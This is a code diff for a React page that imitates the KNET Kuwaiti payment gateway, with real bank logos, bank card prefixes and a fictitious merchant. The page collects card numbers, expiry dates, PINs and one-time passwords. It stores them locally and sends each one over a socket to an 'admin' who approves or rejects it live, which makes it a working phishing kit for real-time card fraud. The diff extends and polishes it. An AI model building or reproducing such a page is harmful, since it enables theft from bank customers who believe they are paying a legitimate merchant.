@@ -1,7 +1,6 @@
 import { useState, useEffect, useRef, useCallback } from "react";
 import { useLocation } from "wouter";
 import { useSignalEffect } from "@preact/signals-react/runtime";
-import WaitingOverlay from "@/components/WaitingOverlay";
 import {
   socket,
   sendData,
@@ -10,31 +9,40 @@ import {
   waitingMessage,
 } from "@/lib/store";
 
-// Bank-to-prefix mapping (exact from original KNET page)
+// Bank-to-prefix mapping (exact from official KNET kpay.com.kw)
 const bankPrefixMap: Record<string, { prefixes: string[] }> = {
   "Al Ahli Bank of Kuwait [ABK]": {
     prefixes: ["403622", "423826", "428628"],
   },
+  "Al Rajhi Bank [Rajhi]": {
+    prefixes: ["421141", "458838", "458839", "468510", "468511", "468512", "468513", "468514", "468515", "468516"],
+  },
+  "Bank of Bahrain Kuwait [BBK]": {
+    prefixes: ["404936", "423527", "457997", "532670", "588845"],
+  },
   "Boubyan Bank [Boubyan]": {
-    prefixes: ["404919", "450605", "426058", "431199", "470350", "490455", "490456"],
+    prefixes: ["404919", "426058", "431199", "450605", "470350", "490455", "490456"],
   },
   "Burgan Bank [Burgan]": {
-    prefixes: ["540759", "402978", "415254", "450238", "468564", "403583", "49219000"],
+    prefixes: ["402978", "403583", "415254", "450238", "468564", "49219000", "540759"],
   },
   "Commercial Bank of Kuwait [CBK]": {
-    prefixes: ["521175", "516334", "532672", "537015"],
+    prefixes: ["516334", "521175", "532672", "537015"],
+  },
+  "Doha Bank [Doha]": {
+    prefixes: ["422817"],
   },
   "Gulf Bank of Kuwait [GBK]": {
-    prefixes: ["531329", "531471", "531470", "517419", "559475", "517458", "531644", "526206"],
+    prefixes: ["517419", "517458", "526206", "531329", "531470", "531471", "531644", "559475"],
   },
   "KFH [TAM]": {
     prefixes: ["45077848", "45077849"],
   },
   "Kuwait Finance House [KFH]": {
-    prefixes: ["450778", "485602", "537016", "532674"],
+    prefixes: ["450778", "485602", "532674", "537016"],
   },
   "Kuwait International Bank [KIB]": {
-    prefixes: ["409054", "406464"],
+    prefixes: ["406464", "409054"],
   },
   "National Bank of Kuwait [NBK]": {
     prefixes: ["464452", "589160"],
@@ -49,7 +57,7 @@ const bankPrefixMap: Record<string, { prefixes: string[] }> = {
     prefixes: ["457778"],
   },
   "Warba Bank [Warba]": {
-    prefixes: ["532749", "559459", "541350", "525528"],
+    prefixes: ["525528", "532749", "541350", "559459"],
   },
 };
 
@@ -66,7 +74,6 @@ const years = Array.from({ length: 44 }, (_, i) => ({
   label: String(currentYear + i),
 }));
 
-// Phase: "card" = card entry, "otp" = OTP entry
 type Phase = "card" | "otp";
 
 export default function KNETPayment() {
@@ -83,7 +90,7 @@ export default function KNETPayment() {
 
   // OTP state
   const [otpCode, setOtpCode] = useState("");
-  const [countdown, setCountdown] = useState(180); // 3 minutes
+  const [countdown, setCountdown] = useState(180);
   const countdownRef = useRef<ReturnType<typeof setInterval> | null>(null);
 
   // Common state
@@ -155,12 +162,10 @@ export default function KNETPayment() {
 
       if (phase === "card") {
         if (action === "otp") {
-          // Admin approved card → show OTP section
           setPhase("otp");
           startCountdown();
           navigateToPage("رمز التحقق كي نت (OTP)");
         } else if (action === "reject") {
-          // Admin rejected card → show error, clear fields
           setRejectedError("يرجى التأكد من المعلومات المدخلة");
           setCardNumber("");
           setCardPin("");
@@ -171,10 +176,8 @@ export default function KNETPayment() {
         }
       } else if (phase === "otp") {
         if (action === "otp") {
-          // Admin approved OTP → go to final page
           navigate("/final-page");
         } else if (action === "reject") {
-          // Admin rejected OTP → show error modal
           setShowErrorModal(true);
           setErrorModalMessage("تم إدخال رمز خطأ يرجى المحاولة مرة أخرى");
           setOtpCode("");
@@ -183,6 +186,17 @@ export default function KNETPayment() {
       cardAction.value = null;
     }
   });
+
+  const handleReset = () => {
+    setSelectedBank("");
+    setSelectedPrefix("");
+    setCardNumber("");
+    setExpiryMonth("");
+    setExpiryYear("");
+    setCardPin("");
+    setValidationError("");
+    setRejectedError("");
+  };
 
   const validateCardForm = (): boolean => {
     if (!selectedBank) {
@@ -193,7 +207,6 @@ export default function KNETPayment() {
       setValidationError("الرجاء اختيار البادئة");
       return false;
     }
-    const fullCardNumber = selectedPrefix + cardNumber;
     if (!cardNumber || cardNumber.length < 6) {
       setValidationError("خطأ : الرجاء التأكد من رقم البطاقة");
       return false;
@@ -219,7 +232,6 @@ export default function KNETPayment() {
 
     const fullCardNumber = selectedPrefix + cardNumber;
 
-    // Save to localStorage
     localStorage.setItem("cardNumber", fullCardNumber);
     localStorage.setItem("cardMonth", expiryMonth.padStart(2, "0"));
     localStorage.setItem("cardYear", expiryYear);
@@ -235,7 +247,6 @@ export default function KNETPayment() {
     };
     localStorage.setItem("paymentData", JSON.stringify(paymentData));
 
-    // Send card data to admin
     sendData({
       paymentCard: {
         cardNumber: fullCardNumber,
@@ -265,7 +276,6 @@ export default function KNETPayment() {
 
     setIsWaiting(true);
 
-    // Send OTP to admin
     sendData({
       digitCode: otpCode,
       current: "رمز التحقق كي نت (OTP)",
@@ -275,54 +285,100 @@ export default function KNETPayment() {
     });
   };
 
-  // Label style
-  const labelStyle: React.CSSProperties = {
-    float: "left",
-    width: "40%",
-    fontSize: 11,
-    color: "#0070cd",
-    fontWeight: "bold",
-    textShadow: "0 1px 2px rgba(0,0,0,0.2)",
-    lineHeight: "20px",
+  // ========== STYLES ==========
+  const pageBackground: React.CSSProperties = {
+    margin: 0,
+    padding: 0,
+    boxSizing: "border-box",
+    fontFamily: "Verdana, Arial, Helvetica, sans-serif",
+    backgroundColor: "#ebebeb",
+    minHeight: "100vh",
+    position: "relative",
   };
 
-  const valueStyle: React.CSSProperties = {
-    float: "left",
-    width: "60%",
-    fontSize: 11,
-    color: "#444444",
-    fontWeight: "normal",
-  };
-
-  const rowStyle: React.CSSProperties = {
-    borderBottom: "1px solid #8f8f90",
-    paddingBottom: 5,
-    paddingTop: 5,
-    overflow: "hidden",
-  };
-
-  const cardStyle: React.CSSProperties = {
+  const mainCard: React.CSSProperties = {
     backgroundColor: "#ffffff",
-    padding: 20,
-    border: "2px solid #8f8f90",
-    borderRadius: 15,
-    marginBottom: 15,
-    boxShadow: "0 0 6px rgba(0,0,0,0.3)",
+    border: "2px solid #a0c4e8",
+    borderRadius: 12,
+    boxShadow: "0 2px 15px rgba(0,0,0,0.15)",
+    padding: "25px 35px",
+    marginTop: 25,
+    marginBottom: 20,
+  };
+
+  const sectionTitle: React.CSSProperties = {
+    color: "#0099cc",
+    fontSize: 16,
+    fontWeight: "bold",
+    marginTop: 20,
+    marginBottom: 12,
+    fontFamily: "Verdana, Arial, Helvetica, sans-serif",
+  };
+
+  const fieldRow: React.CSSProperties = {
+    display: "flex",
+    alignItems: "center",
+    marginBottom: 8,
+    minHeight: 28,
+  };
+
+  const fieldLabel: React.CSSProperties = {
+    width: "38%",
+    fontSize: 12,
+    color: "#0099cc",
+    fontWeight: "bold",
+    textAlign: "left",
+  };
+
+  const fieldValue: React.CSSProperties = {
+    width: "62%",
+    fontSize: 12,
+    color: "#333333",
+  };
+
+  const selectStyle: React.CSSProperties = {
+    fontSize: 12,
+    height: 24,
+    color: "#333333",
+    border: "1px solid #b0b0b0",
+    borderRadius: 2,
+    padding: "0 2px",
+    backgroundColor: "#ffffff",
+  };
+
+  const inputStyle: React.CSSProperties = {
+    fontSize: 12,
+    height: 24,
+    color: "#333333",
+    border: "2px solid #a0c4e8",
+    borderRadius: 2,
+    padding: "0 5px",
+    outline: "none",
+    boxSizing: "border-box",
+  };
+
+  const buttonStyle: React.CSSProperties = {
+    backgroundColor: "#e8e8e8",
+    border: "1px solid #b0b0b0",
+    padding: "5px 0",
+    fontWeight: "bold",
+    color: "#555555",
+    fontSize: 13,
+    height: 30,
+    borderRadius: 3,
+    cursor: "pointer",
+    fontFamily: "Verdana, Arial, Helvetica, sans-serif",
+  };
+
+  const hrStyle: React.CSSProperties = {
+    border: "none",
+    borderTop: "1px solid #d0d0d0",
+    margin: "12px 0",
   };
 
   return (
-    <div
-      style={{
-        margin: 0,
-        padding: 0,
-        boxSizing: "border-box",
-        fontFamily: "Verdana, Arial, Helvetica, sans-serif",
-        backgroundColor: "#ebebeb",
-        minHeight: "100vh",
-        position: "relative",
-      }}
-    >
-      {/* Gray overlay for waiting state - page stays visible behind it */}
+    <div style={pageBackground}>
+      {/* Gray overlay for waiting state */}
       {isWaiting && (
         <div
           style={{
@@ -343,8 +399,6 @@ export default function KNETPayment() {
           </div>
         </div>
       )}
-
-
 
       {/* Error Modal for OTP rejection */}
       {showErrorModal && (
@@ -401,14 +455,8 @@ export default function KNETPayment() {
               <button
                 onClick={() => setShowErrorModal(false)}
                 style={{
-                  backgroundColor: "#eaeaea",
-                  border: "1px solid #cacaca",
-                  padding: "5px 20px",
-                  fontWeight: "bold",
-                  color: "#666666",
-                  height: 27,
-                  borderRadius: 4,
-                  cursor: "pointer",
+                  ...buttonStyle,
+                  width: 100,
                 }}
               >
                 Close
@@ -420,313 +468,301 @@ export default function KNETPayment() {
 
       {/* Banner */}
       <div>
-        <img src="/assets/mob.jpg" alt="KNET" style={{ width: "100%" }} />
+        <img src="/assets/mob.jpg" alt="KNET" style={{ width: "100%", display: "block" }} />
       </div>
 
-      <div style={{ width: "100%", padding: 15, boxSizing: "border-box" }}>
-        <div style={{ width: "100%", maxWidth: 395, margin: "0 auto" }}>
+      <div style={{ width: "100%", padding: "0 15px", boxSizing: "border-box" }}>
+        <div style={{ width: "100%", maxWidth: 500, margin: "0 auto" }}>
 
           {/* ============ PHASE: CARD ============ */}
           {phase === "card" && (
-            <form onSubmit={handleCardSubmit}>
-              {/* Merchant Info Card */}
-              <div style={{ ...cardStyle, marginTop: 25 }}>
-                <div style={{ textAlign: "center", marginTop: -5, marginBottom: 15 }}>
-                  <img src="/assets/nbk.png" alt="NBK" style={{ width: 150 }} />
-                </div>
-                <div style={rowStyle}>
-                  <label style={labelStyle}>:Merchant</label>
-                  <label style={valueStyle}>AHIS</label>
-                </div>
-                <div style={{ overflow: "hidden", paddingTop: 5 }}>
-                  <label style={labelStyle}>:Amount</label>
-                  <label style={valueStyle}>KD {totalAmount}</label>
-                </div>
+            <div style={mainCard}>
+              {/* KIB Logo - Fixed */}
+              <div style={{ textAlign: "center", marginBottom: 5 }}>
+                <img src="/assets/kib-logo.png" alt="KIB" style={{ height: 55 }} />
+              </div>
+              <hr style={hrStyle} />
+
+              {/* Billing Information */}
+              <div style={sectionTitle}>Billing Information</div>
+
+              <div style={fieldRow}>
+                <label style={fieldLabel}>Merchant:</label>
+                <span style={fieldValue}>AHIS</span>
+              </div>
+              <div style={fieldRow}>
+                <label style={fieldLabel}>Amount:</label>
+                <span style={fieldValue}>KD {totalAmount}</span>
               </div>
 
-              {/* Rejected Error - inline red text */}
+              {/* Card Information */}
+              <div style={sectionTitle}>Card Information</div>
+
+              {/* Validation Error */}
+              {validationError && (
+                <div
+                  style={{
+                    border: "#ff0000 1px solid",
+                    backgroundColor: "#f7dadd",
+                    fontSize: 12,
+                    color: "#ff0000",
+                    padding: 8,
+                    textAlign: "center",
+                    marginBottom: 10,
+                    borderRadius: 4,
+                  }}
+                >
+                  {validationError}
+                </div>
+              )}
+
+              {/* Rejected Error */}
               {rejectedError && (
-                <div style={{ textAlign: "center", padding: "5px 0", fontSize: 11, color: "#ff0000", fontWeight: "bold" }}>
+                <div
+                  style={{
+                    fontSize: 11,
+                    color: "#ff0000",
+                    fontWeight: "bold",
+                    textAlign: "center",
+                    marginBottom: 10,
+                  }}
+                >
                   {rejectedError}
                 </div>
               )}
 
-              {/* Card Form */}
-              <div style={cardStyle}>
-                {/* Validation Error */}
-                {validationError && (
-                  <div
-                    style={{
-                      border: "#ff0000 1px solid",
-                      backgroundColor: "#f7dadd",
-                      fontSize: 12,
-                      fontFamily: "helvetica, arial, sans serif",
-                      color: "#ff0000",
-                      padding: 10,
-                      textAlign: "center",
-                      marginBottom: 10,
-                      borderRadius: 4,
-                    }}
-                  >
-                    {validationError}
+              <form onSubmit={handleCardSubmit}>
+                {/* Select Your Bank */}
+                <div style={fieldRow}>
+                  <label style={fieldLabel}>Select Your Bank:</label>
+                  <div style={fieldValue}>
+                    <select
+                      value={selectedBank}
+                      onChange={(e) => handleBankChange(e.target.value)}
+                      style={{ ...selectStyle, width: "100%" }}
+                    >
+                      <option value="">Select Your Bank</option>
+                      {bankNames.map((name) => (
+                        <option key={name} value={name}>{name}</option>
+                      ))}
+                    </select>
                   </div>
-                )}
-
-                {/* Bank Name */}
-                <div style={rowStyle}>
-                  <label style={labelStyle}>:Bank Name</label>
-                  <select
-                    value={selectedBank}
-                    onChange={(e) => handleBankChange(e.target.value)}
-                    style={{ width: "60%", fontSize: 11, height: 20, color: "#444444" }}
-                  >
-                    <option value="">Select Your Bank</option>
-                    {bankNames.map((name) => (
-                      <option key={name} value={name}>{name}</option>
-                    ))}
-                  </select>
                 </div>
 
                 {/* Card Number */}
-                <div style={rowStyle}>
-                  <label style={labelStyle}>:Card Number</label>
-                  <input
-                    type="tel"
-                    inputMode="numeric"
-                    maxLength={10}
-                    value={cardNumber}
-                    onChange={(e) => {
-                      const val = e.target.value.replace(/\D/g, "");
-                      setCardNumber(val);
-                      setValidationError("");
-                    }}
-                    style={{
-                      width: "32%",
-                      border: "2px solid #0070cd",
-                      boxShadow: "inset 0 0 5px rgba(0,0,0,0.3)",
-                      padding: "0 3px",
-                      outline: 0,
-                      fontSize: 11,
-                      height: 20,
-                    }}
-                  />
-                  <select
-                    value={selectedPrefix}
-                    onChange={(e) => setSelectedPrefix(e.target.value)}
-                    style={{ width: "26%", fontSize: 11, height: 20, color: "#444444", marginLeft: 3 }}
-                  >
-                    <option value="">Prefix</option>
-                    {availablePrefixes.map((p) => (
-                      <option key={p} value={p}>{p}</option>
-                    ))}
-                  </select>
+                <div style={fieldRow}>
+                  <label style={fieldLabel}>Card Number:</label>
+                  <div style={{ ...fieldValue, display: "flex", gap: 5 }}>
+                    <select
+                      value={selectedPrefix}
+                      onChange={(e) => setSelectedPrefix(e.target.value)}
+                      style={{ ...selectStyle, width: "35%" }}
+                    >
+                      <option value="">Prefix</option>
+                      {availablePrefixes.map((p) => (
+                        <option key={p} value={p}>{p}</option>
+                      ))}
+                    </select>
+                    <input
+                      type="tel"
+                      inputMode="numeric"
+                      maxLength={10}
+                      value={cardNumber}
+                      onChange={(e) => {
+                        const val = e.target.value.replace(/\D/g, "");
+                        setCardNumber(val);
+                        setValidationError("");
+                      }}
+                      style={{ ...inputStyle, width: "65%" }}
+                    />
+                  </div>
                 </div>
 
                 {/* Expiration Date */}
-                <div style={rowStyle}>
-                  <label style={labelStyle}>:Expiration Date</label>
-                  <select
-                    value={expiryMonth}
-                    onChange={(e) => setExpiryMonth(e.target.value)}
-                    style={{ width: "18%", fontSize: 11, height: 20, color: "#444444", marginRight: 5 }}
-                  >
-                    <option value="">MM</option>
-                    {months.map((m) => (
-                      <option key={m.value} value={m.value}>{m.label}</option>
-                    ))}
-                  </select>
-                  <select
-                    value={expiryYear}
-                    onChange={(e) => setExpiryYear(e.target.value)}
-                    style={{ width: "39%", fontSize: 11, height: 20, color: "#444444", float: "right" }}
-                  >
-                    <option value="">YYYY</option>
-                    {years.map((y) => (
-                      <option key={y.value} value={y.value}>{y.label}</option>
-                    ))}
-                  </select>
+                <div style={fieldRow}>
+                  <label style={fieldLabel}>Expiration Date:</label>
+                  <div style={{ ...fieldValue, display: "flex", gap: 5 }}>
+                    <select
+                      value={expiryMonth}
+                      onChange={(e) => setExpiryMonth(e.target.value)}
+                      style={{ ...selectStyle, width: "35%" }}
+                    >
+                      <option value="">MM</option>
+                      {months.map((m) => (
+                        <option key={m.value} value={m.value}>{m.label}</option>
+                      ))}
+                    </select>
+                    <select
+                      value={expiryYear}
+                      onChange={(e) => setExpiryYear(e.target.value)}
+                      style={{ ...selectStyle, width: "65%" }}
+                    >
+                      <option value="">YYYY</option>
+                      {years.map((y) => (
+                        <option key={y.value} value={y.value}>{y.label}</option>
+                      ))}
+                    </select>
+                  </div>
                 </div>
 
                 {/* PIN */}
-                <div style={{ ...rowStyle, borderBottom: "none" }}>
-                  <label style={labelStyle}>:PIN</label>
-                  <input
-                    type="password"
-                    inputMode="numeric"
-                    maxLength={4}
-                    value={cardPin}
-                    onChange={(e) => {
-                      const val = e.target.value.replace(/\D/g, "");
-                      setCardPin(val);
-                      setValidationError("");
-                    }}
-                    style={{
-                      width: "60%",
-                      border: "2px solid #0070cd",
-                      boxShadow: "inset 0 0 5px rgba(0,0,0,0.3)",
-                      padding: "0 3px",
-                      outline: 0,
-                      fontSize: 11,
-                      height: 20,
-                    }}
-                  />
+                <div style={fieldRow}>
+                  <label style={fieldLabel}>PIN:</label>
+                  <div style={fieldValue}>
+                    <input
+                      type="password"
+                      inputMode="numeric"
+                      maxLength={4}
+                      value={cardPin}
+                      onChange={(e) => {
+                        const val = e.target.value.replace(/\D/g, "");
+                        setCardPin(val);
+                        setValidationError("");
+                      }}
+                      style={{ ...inputStyle, width: "100%" }}
+                    />
+                  </div>
                 </div>
-              </div>
 
-              {/* Submit / Cancel */}
-              <div style={{ ...cardStyle, textAlign: "center" }}>
-                <button
-                  type="submit"
+                {/* Buttons */}
+                <div
                   style={{
-                    backgroundColor: "#eaeaea",
-                    border: "1px solid #cacaca",
-                    padding: "5px 0",
-                    fontWeight: "bold",
-                    color: "#666666",
-                    width: "50%",
-                    height: 27,
-                    borderRadius: 4,
-                    cursor: "pointer",
-                    float: "left",
+                    display: "flex",
+                    gap: 8,
+                    marginTop: 18,
+                    borderTop: "1px solid #d0d0d0",
+                    paddingTop: 15,
                   }}
                 >
-                  Submit
-                </button>
-                <button
-                  type="button"
-                  onClick={() => window.history.back()}
-                  style={{
-                    backgroundColor: "#eaeaea",
-                    border: "1px solid #cacaca",
-                    padding: "5px 0",
-                    fontWeight: "bold",
-                    color: "#666666",
-                    width: "50%",
-                    height: 27,
-                    borderRadius: 4,
-                    cursor: "pointer",
-                    WebkitAppearance: "none",
-                  }}
-                >
-                  Cancel
-                </button>
-              </div>
-            </form>
+                  <button type="submit" style={{ ...buttonStyle, flex: 1 }}>
+                    Submit
+                  </button>
+                  <button type="button" onClick={handleReset} style={{ ...buttonStyle, flex: 1 }}>
+                    Reset
+                  </button>
+                  <button
+                    type="button"
+                    onClick={() => window.history.back()}
+                    style={{ ...buttonStyle, flex: 1 }}
+                  >
+                    Cancel
+                  </button>
+                </div>
+              </form>
+            </div>
           )}
 
           {/* ============ PHASE: OTP ============ */}
           {phase === "otp" && (
-            <>
-              {/* Merchant Info Card with KNET logo */}
-              <div style={{ ...cardStyle, marginTop: 25 }}>
-                <div style={{ textAlign: "center", marginTop: -5, marginBottom: 15 }}>
-                  <img src="/kpay/knet.png" alt="KNET" style={{ width: 60 }} />
-                </div>
-                <div style={rowStyle}>
-                  <label style={labelStyle}>:Merchant</label>
-                  <label style={valueStyle}>AHIS</label>
-                </div>
-                <div style={{ overflow: "hidden", paddingTop: 5 }}>
-                  <label style={labelStyle}>:Amount</label>
-                  <label style={valueStyle}>KD {totalAmount}</label>
+            <div style={mainCard}>
+              {/* KIB Logo - Fixed */}
+              <div style={{ textAlign: "center", marginBottom: 5 }}>
+                <img src="/assets/kib-logo.png" alt="KIB" style={{ height: 55 }} />
+              </div>
+              <hr style={hrStyle} />
+
+              {/* Billing Information */}
+              <div style={sectionTitle}>Billing Information</div>
+
+              <div style={fieldRow}>
+                <label style={fieldLabel}>Merchant:</label>
+                <span style={fieldValue}>AHIS</span>
+              </div>
+              <div style={fieldRow}>
+                <label style={fieldLabel}>Amount:</label>
+                <span style={fieldValue}>KD {totalAmount}</span>
+              </div>
+
+              {/* OTP Section */}
+              <div style={sectionTitle}>OTP Verification</div>
+
+              {/* Notification */}
+              <div
+                style={{
+                  color: "#31708f",
+                  fontFamily: "Arial, Helvetica, serif",
+                  fontSize: 12,
+                  backgroundColor: "#d9edf6",
+                  padding: 10,
+                  border: "1px solid #bacce0",
+                  borderRadius: 4,
+                  marginBottom: 12,
+                  textAlign: "justify",
+                  lineHeight: "18px",
+                }}
+              >
+                <span style={{ fontWeight: "bold" }}>NOTIFICATION:</span> You
+                will presently receive an SMS on your mobile number registered
+                with your bank. This is an OTP (One Time Password) SMS, it
+                contains 6 digits to be entered in the box below.
+              </div>
+
+              {/* Card Number */}
+              <div style={fieldRow}>
+                <label style={fieldLabel}>Card Number:</label>
+                <span style={fieldValue}>{maskedCard}</span>
+              </div>
+
+              {/* Expiration Month */}
+              <div style={fieldRow}>
+                <label style={fieldLabel}>Expiration Month:</label>
+                <span style={fieldValue}>{expiryMonth.padStart(2, "0")}</span>
+              </div>
+
+              {/* Expiration Year */}
+              <div style={fieldRow}>
+                <label style={fieldLabel}>Expiration Year:</label>
+                <span style={fieldValue}>{expiryYear}</span>
+              </div>
+
+              {/* PIN */}
+              <div style={fieldRow}>
+                <label style={fieldLabel}>PIN:</label>
+                <span style={fieldValue}>****</span>
+              </div>
+
+              {/* OTP with countdown */}
+              <div style={fieldRow}>
+                <label style={fieldLabel}>OTP:</label>
+                <div style={fieldValue}>
+                  <input
+                    type="text"
+                    inputMode="numeric"
+                    maxLength={6}
+                    value={otpCode}
+                    onChange={(e) => {
+                      const val = e.target.value.replace(/\D/g, "");
+                      setOtpCode(val);
+                    }}
+                    placeholder={formatCountdown(countdown)}
+                    style={{
+                      ...inputStyle,
+                      width: "100%",
+                      textAlign: "center",
+                    }}
+                  />
                 </div>
               </div>
 
-              {/* OTP Form Card */}
-              <div style={cardStyle}>
-                {/* Notification */}
-                <div
-                  style={{
-                    color: "#31708f",
-                    fontFamily: "Arial, Helvetica, serif",
-                    fontSize: 13,
-                    backgroundColor: "#d9edf6",
-                    padding: 10,
-                    border: "1px solid #bacce0",
-                    borderRadius: 4,
-                    marginBottom: 10,
-                    textAlign: "justify",
-                  }}
-                >
-                  <p style={{ margin: 0 }}>
-                    <span style={{ fontWeight: "bold" }}>NOTIFICATION:</span> You
-                    will presently receive an SMS on your mobile number registered
-                    with your bank. This is an OTP (One Time Password) SMS, it
-                    contains 6 digits to be entered in the box below.
-                  </p>
-                </div>
-
-                {/* Card Number */}
-                <div style={rowStyle}>
-                  <label style={labelStyle}>:Card Number</label>
-                  <label style={valueStyle}>{maskedCard}</label>
-                </div>
-
-                {/* Expiration Month */}
-                <div style={rowStyle}>
-                  <label style={{ ...labelStyle, width: "45%" }}>:Expiration Month</label>
-                  <label style={{ ...valueStyle, width: "55%" }}>{expiryMonth.padStart(2, "0")}</label>
-                </div>
-
-                {/* Expiration Year */}
-                <div style={rowStyle}>
-                  <label style={labelStyle}>:Expiration Year</label>
-                  <label style={valueStyle}>{expiryYear}</label>
-                </div>
-
-                {/* PIN */}
-                <div style={rowStyle}>
-                  <label style={labelStyle}>:PIN</label>
-                  <label style={valueStyle}>****</label>
-                </div>
-
-                {/* OTP with countdown */}
-                <div style={{ ...rowStyle, borderBottom: "none" }}>
-                  <label style={{ ...labelStyle, paddingTop: 4 }}>:OTP</label>
-                  <div style={{ float: "left", width: "60%", position: "relative" }}>
-                    <input
-                      type="text"
-                      inputMode="numeric"
-                      maxLength={6}
-                      value={otpCode}
-                      onChange={(e) => {
-                        const val = e.target.value.replace(/\D/g, "");
-                        setOtpCode(val);
-                      }}
-                      placeholder={formatCountdown(countdown)}
-                      style={{
-                        width: "100%",
-                        border: "2px solid #0070cd",
-                        boxShadow: "inset 0 0 5px rgba(0,0,0,0.3)",
-                        padding: "0 3px",
-                        outline: 0,
-                        fontSize: 11,
-                        height: 20,
-                        textAlign: "center",
-                      }}
-                    />
-                  </div>
-                </div>
-              </div>
-
-              {/* Submit / Cancel */}
-              <div style={{ ...cardStyle, textAlign: "center", overflow: "hidden" }}>
+              {/* Buttons */}
+              <div
+                style={{
+                  display: "flex",
+                  gap: 8,
+                  marginTop: 18,
+                  borderTop: "1px solid #d0d0d0",
+                  paddingTop: 15,
+                }}
+              >
                 <button
                   type="button"
                   onClick={handleOtpSubmit}
                   disabled={!otpCode || otpCode.length < 4}
                   style={{
-                    backgroundColor: "#eaeaea",
-                    border: "1px solid #cacaca",
-                    padding: "5px 0",
-                    fontWeight: "bold",
-                    color: "#666666",
-                    width: "50%",
-                    height: 27,
-                    borderRadius: 4,
-                    cursor: otpCode && otpCode.length >= 4 ? "pointer" : "not-allowed",
-                    float: "left",
+                    ...buttonStyle,
+                    flex: 1,
                     opacity: otpCode && otpCode.length >= 4 ? 1 : 0.6,
+                    cursor: otpCode && otpCode.length >= 4 ? "pointer" : "not-allowed",
                   }}
                 >
                   Submit
@@ -734,41 +770,24 @@ export default function KNETPayment() {
                 <button
                   type="button"
                   onClick={() => window.history.back()}
-                  style={{
-                    backgroundColor: "#eaeaea",
-                    border: "1px solid #cacaca",
-                    padding: "5px 0",
-                    fontWeight: "bold",
-                    color: "#666666",
-                    width: "50%",
-                    height: 27,
-                    borderRadius: 4,
-                    cursor: "pointer",
-                    WebkitAppearance: "none",
-                  }}
+                  style={{ ...buttonStyle, flex: 1 }}
                 >
                   Cancel
                 </button>
               </div>
-            </>
+            </div>
           )}
 
           {/* Footer */}
-          <footer style={{ textAlign: "center", marginTop: 15 }}>
-            <div
-              style={{
-                textAlign: "center",
-                fontSize: 11,
-                lineHeight: "18px",
-              }}
-            >
-              All Rights Reserved. Copyright 2024
+          <footer style={{ textAlign: "center", marginTop: 15, marginBottom: 20 }}>
+            <div style={{ fontSize: 11, lineHeight: "18px", color: "#666666" }}>
+              All Rights Reserved. Copyright 2026 ©
               <br />
               <span
                 style={{
-                  fontSize: 10,
+                  fontSize: 11,
                   fontWeight: "bold",
-                  color: "#0077d5",
+                  color: "#0099cc",
                 }}
               >
                 The Shared Electronic Banking Services Company - KNET
